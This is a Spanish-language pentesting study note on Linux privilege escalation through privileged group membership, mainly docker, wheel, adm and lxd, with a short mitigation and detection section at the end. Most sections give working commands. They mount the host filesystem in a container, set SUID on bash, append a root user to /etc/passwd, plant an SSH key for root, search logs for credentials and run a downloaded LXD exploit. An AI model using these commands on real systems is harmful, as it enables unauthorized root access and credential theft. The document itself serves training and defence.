# 🔐 Abuso de Grupos de Usuario Especiales: Escalada de Privilegios

> [!warning] Vector crítico de escalada
> Los **grupos especiales de usuario** son uno de los vectores más comunes pero pasados por alto para la escalada de privilegios en sistemas Linux. Muchos administradores asignan usuarios a grupos privilegiados sin comprender completamente las implicaciones de seguridad.

---

## 📋 Tabla de Contenidos
- [Identificación de Grupos](#identificación-de-grupos)
- [Grupos Críticos](#grupos-críticos)
  - [Docker Group](#docker-group)
  - [Wheel Group](#wheel-group)
  - [ADM Group](#adm-group)
  - [LXD Group](#lxd-group)
- [Metodología de Explotación](#metodología-de-explotación)
- [Detección y Mitigación](#detección-y-mitigación)

---

## 🔍 Identificación de Grupos

### Enumeración inicial

El primer paso tras comprometer un sistema es identificar los grupos a los que pertenece el usuario actual:

```bash
# Ver información detallada del usuario actual
id

# Ejemplo de salida peligrosa:
# uid=1000(liskov) gid=1000(liskov) grupos=1000(liskov),963(docker),998(wheel)

# Información adicional sobre grupos
groups

# Ver todos los grupos del sistema
getent group

# Verificar usuarios en grupos específicos
getent group docker
getent group wheel
getent group adm
```

### Análisis de permisos especiales

```mermaid
graph TD
    A[Usuario Comprometido] --> B[Identificar Grupos]
    B --> C{Grupos Peligrosos?}
    C -->|Sí| D[Docker]
    C -->|Sí| E[Wheel]
    C -->|Sí| F[ADM]
    C -->|Sí| G[LXD]
    C -->|No| H[Buscar otros vectores]
    
    D --> I[Container Escape]
    E --> J[Sudo Access]
    F --> K[Log Access]
    G --> L[Container Privilege Escalation]
    
    style C fill:#fff3e0,stroke:#f57c00
    style I fill:#ffcdd2,stroke:#d32f2f
    style J fill:#ffcdd2,stroke:#d32f2f
    style K fill:#fff3e0,stroke:#ff9800
    style L fill:#ffcdd2,stroke:#d32f2f
```



---

## 🐳 Docker Group

> [!danger] Equivalente a acceso root
> Pertenecer al grupo `docker` es **equivalente a tener acceso root** en el sistema, ya que permite ejecutar contenedores con montajes privilegiados.

### ¿Por qué es peligroso?

Docker ejecuta como demonio con privilegios de root. Los usuarios del grupo `docker` pueden:
- Crear contenedores con montajes arbitrarios
- Acceder a todo el sistema de archivos del host
- Ejecutar procesos como root dentro del contenedor

### Explotación paso a paso

#### 1. Verificar acceso a Docker

```bash
# Comprobar que Docker está disponible
docker --version

# Verificar que podemos ejecutar comandos Docker
docker ps
```

#### 2. Obtener imagen base

```bash
# Descargar imagen de Ubuntu (o usar cualquier imagen disponible)
docker pull ubuntu:latest

# Ver imágenes disponibles
docker images
```

#### 3. Crear contenedor con montaje peligroso

```bash
# Montar el sistema de archivos completo del host
docker run --rm -dit -v /:/mnt/root --name priv ubuntu

# Explicación de parámetros:
# --rm: Eliminar contenedor al salir
# -dit: Detached, interactive, pseudo-TTY
# -v /:/mnt/root: Montar raíz del host en /mnt/root del contenedor
# --name priv: Nombrar el contenedor como 'priv'
```

> [!example] ¿Qué hace el montaje?
> El parámetro `-v /:/mnt/root` monta **todo el sistema de archivos del host** dentro del contenedor en `/mnt/root`. Esto significa que:
> - Puedes acceder a **cualquier archivo** del sistema host
> - Los cambios se reflejan **directamente** en el sistema host
> - Puedes modificar archivos críticos como `/etc/passwd`, `/etc/shadow`
> - Puedes asignar **permisos SUID** a binarios

#### 4. Acceder al contenedor y escalar privilegios

```bash
# Entrar al contenedor como root
docker exec -it priv bash

# Navegar al sistema de archivos del host
cd /mnt/root

# Ahora estás en la raíz del sistema host con privilegios de root
ls -la

# Opciones de escalada:
# 1. Modificar /etc/passwd para agregar usuario root
# 2. Asignar SUID a bash
# 3. Agregar clave SSH a root
# 4. Modificar sudoers
```

#### Técnicas específicas de escalada:

```bash
# Método 1: Asignar SUID a bash
chmod u+s /mnt/root/bin/bash

# Salir del contenedor y ejecutar bash con privilegios
exit
/bin/bash -p  # El flag -p mantiene privilegios

# Método 2: Crear usuario root adicional
echo 'hacker:$6$xyz$hashedpassword:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd

# Método 3: Agregar clave SSH
mkdir -p /mnt/root/root/.ssh
echo 'tu_clave_publica' >> /mnt/root/root/.ssh/authorized_keys
chmod 600 /mnt/root/root/.ssh/authorized_keys
chmod 700 /mnt/root/root/.ssh
```

---

## ⚙️ Wheel Group

> [!info] Grupo administrativo tradicional
> El grupo `wheel` es tradicionalmente usado en sistemas BSD y algunas distribuciones Linux para identificar usuarios con capacidades administrativas.

### Configuración típica

En distribuciones como **Arch Linux**, el archivo `/etc/sudoers` está configurado para permitir sudo a miembros del grupo wheel:

```bash
# Verificar configuración en /etc/sudoers
sudo cat /etc/sudoers | grep wheel

# Configuración típica:
# %wheel ALL=(ALL) ALL
```

### Explotación

```bash
# Si eres miembro del grupo wheel, probablemente puedes usar sudo
sudo -l

# Intentar obtener shell root
sudo su -
sudo bash

# Si hay restricciones, explorar comandos permitidos
sudo -l -U username
```

---

## 📊 ADM Group

> [!tip] Acceso a logs del sistema
> El grupo `adm` tradicionalmente tiene acceso de lectura a los archivos de log del sistema, lo que puede revelar información sensible.

### Gestión del grupo ADM

```bash
# Agregar usuario al grupo adm (para pruebas)
sudo usermod -a -G adm username

# Eliminar usuario del grupo adm
sudo gpasswd -d username adm

# Verificar miembros del grupo
getent group adm
```

### Información disponible

Los miembros del grupo `adm` pueden acceder a logs en `/var/log/`:

```bash
# Logs accesibles típicamente
ls -la /var/log/

# Información sensible que puede encontrarse:
cat /var/log/auth.log          # Intentos de autenticación
cat /var/log/syslog           # Mensajes del sistema
cat /var/log/apache2/access.log # Logs de servidor web
cat /var/log/mail.log         # Logs de correo

# Buscar credenciales o información sensible
grep -r "password\|credential\|token" /var/log/ 2>/dev/null
grep -r "user\|login\|auth" /var/log/auth.log
```

### Vectores de escalada desde ADM

```bash
# Buscar credenciales en logs
grep -i "password" /var/log/*.log 2>/dev/null

# Identificar servicios y versiones
grep -i "started\|service" /var/log/syslog

# Buscar errores que puedan indicar vulnerabilidades
grep -i "error\|failed\|exception" /var/log/*.log
```

---

## 📦 LXD Group

> [!warning] Similar a Docker
> LXD es un hypervisor de contenedores que, al igual que Docker, puede ser abusado para escalada de privilegios mediante montajes privilegiados.

### Identificación de LXD

```bash
# Verificar si LXD está instalado y disponible
lxd --version
lxc --version

# Ver contenedores existentes
lxc list

# Ver imágenes disponibles
lxc image list
```

### Explotación con LXD

El proceso es similar a Docker pero usando comandos LXD:

```bash
# Crear contenedor con montaje privilegiado
lxc init ubuntu:18.04 privesc -c security.privileged=true

# Montar sistema de archivos del host
lxc config device add privesc host-root disk source=/ path=/mnt/root

# Iniciar contenedor
lxc start privesc

# Ejecutar shell en el contenedor
lxc exec privesc /bin/bash
```

### Uso de exploits automatizados

Con [[searchsploit]] podemos encontrar exploits específicos para LXD:

```bash
# Buscar exploits de escalada de privilegios para LXD
searchsploit "lxd privilege escalation"

# Descargar exploit específico
searchsploit -m linux/local/46978.sh

# Ejecutar exploit (típicamente automatiza el proceso anterior)
chmod +x 46978.sh
./46978.sh
```

---

## 🔄 Metodología de Explotación

### Flujo general de ataque

```mermaid
sequenceDiagram
    participant A as Atacante
    participant S as Sistema Comprometido
    participant C as Contenedor/Servicio
    participant R as Root Access
    
    A->>S: Acceso inicial (usuario limitado)
    A->>S: id (identificar grupos)
    S->>A: grupos=docker,wheel,adm,lxd
    A->>S: Evaluar vector más prometedor
    
    alt Docker disponible
        A->>C: docker run con montaje privilegiado
        C->>S: Acceso a sistema de archivos host
        A->>R: Modificar archivos críticos
    else Wheel group + sudo
        A->>S: sudo su -
        S->>R: Shell root directo
    else ADM + información sensible
        A->>S: grep credenciales en logs
        S->>A: Credenciales de otros usuarios
        A->>R: Escalada lateral/vertical
    end
```



### Script de enumeración automatizada

```bash
#!/bin/bash
# enum_groups.sh - Enumeración de grupos peligrosos

echo "[*] Enumerando grupos del usuario actual..."
user_groups=$(id | grep -o 'grupos=[^)]*' | cut -d= -f2)
echo "Grupos actuales: $user_groups"

# Comprobar grupos peligrosos
dangerous_groups=("docker" "wheel" "admin" "adm" "lxd" "lxc" "disk" "video")

echo -e "\n[*] Verificando grupos peligrosos..."
for group in "${dangerous_groups[@]}"; do
    if id | grep -q "\b$group\b"; then
        echo "[!] ENCONTRADO: Grupo peligroso '$group'"
        case $group in
            "docker")
                echo "    -> Puede ejecutar: docker run --rm -it -v /:/mnt alpine chroot /mnt sh"
                ;;
            "wheel"|"admin")
                echo "    -> Verificar: sudo -l"
                ;;
            "adm")
                echo "    -> Acceso a logs: ls -la /var/log/"
                ;;
            "lxd"|"lxc")
                echo "    -> Escalada LXD posible"
                ;;
        esac
    fi
done

# Verificar Docker específicamente
if command -v docker &> /dev/null && docker ps &> /dev/null; then
    echo "[!] Docker está disponible y accesible!"
    echo "    Comando de escalada: docker run --rm -dit -v /:/mnt/root --name priv ubuntu"
fi

# Verificar LXD
if command -v lxc &> /dev/null; then
    echo "[!] LXD/LXC disponible!"
    echo "    Buscar exploits: searchsploit lxd privilege escalation"
fi
```

---

## 🛡️ Detección y Mitigación

### Para administradores de sistemas

> [!warning] Recomendaciones de seguridad
> 
> **Principio de menor privilegio:**
> - Solo agregar usuarios a grupos especiales cuando sea **absolutamente necesario**
> - Revisar periódicamente la membresía de grupos críticos
> - Usar herramientas como `sudo` con reglas específicas en lugar de grupos amplios
> 
> **Monitoreo:**
> - Auditar regularmente comandos Docker/LXD ejecutados
> - Monitorear creación de contenedores con montajes privilegiados
> - Alertar sobre modificaciones a archivos críticos del sistema

### Configuraciones más seguras

```bash
# En lugar de agregar usuarios al grupo docker:
# Usar sudo con comandos específicos
echo "username ALL=(ALL) NOPASSWD: /usr/bin/docker run *" >> /etc/sudoers.d/docker-limited

# Para LXD, limitar capacidades:
lxc config set core.unprivileged_only true

# Monitorear actividad de contenedores:
echo 'audit.rules: -w /usr/bin/docker -p x -k docker_exec' >> /etc/audit/rules.d/docker.rules
```

### Scripts de detección

```bash
# Detectar montajes sospechosos en contenedores
docker ps --format "table {{.Names}}\t{{.Mounts}}" | grep -E "(/:|/root|/etc|/var)"

# Auditar grupos peligrosos
for group in docker wheel adm lxd; do
    echo "=== Grupo $group ==="
    getent group $group
done
```

---

## 📚 Otros Grupos Relevantes

### Tabla de grupos adicionales

| Grupo | Descripción | Vector de escalada |
|-------|-------------|-------------------|
| **disk** | Acceso directo a dispositivos de disco | Leer/escribir particiones raw |
| **video** | Acceso a dispositivos de video | Keylogging via framebuffer |
| **audio** | Acceso a dispositivos de audio | Grabación de audio |
| **plugdev** | Acceso a dispositivos conectables | Montaje de dispositivos USB |
| **netdev** | Configuración de red | Manipulación de interfaces de red |
| **sudo** | Acceso directo a sudo | Equivalente a root |

### Comandos de verificación

```bash
# Verificar todos los grupos del usuario actual
id | tr ',' '\n' | grep -E "(docker|wheel|adm|lxd|disk|video|audio|sudo)"

# Buscar usuarios en grupos críticos
for group in docker wheel adm lxd disk video sudo; do
    echo "=== $group ==="
    getent group $group | cut -d: -f4 | tr ',' '\n' | sort
    echo
done
```

---

## 🔗 Referencias

- [[searchsploit]] - Búsqueda de exploits para escalada de privilegios
- Docker Security Best Practices
- LXD/LXC Security Documentation
- Linux Group Management (man pages: groupadd, usermod, gpasswd)

> [!success] Puntos clave para recordar
> - **Enumerar siempre** los grupos del usuario tras comprometer un sistema
> - **Docker y LXD** son prácticamente equivalentes a acceso root
> - El grupo **wheel** a menudo permite sudo sin restricciones
> - El grupo **adm** puede revelar información sensible en logs
> - **Principio de menor privilegio** es crucial para la defensa
> - **Monitoreo activo** puede detectar abusos de grupos privilegiados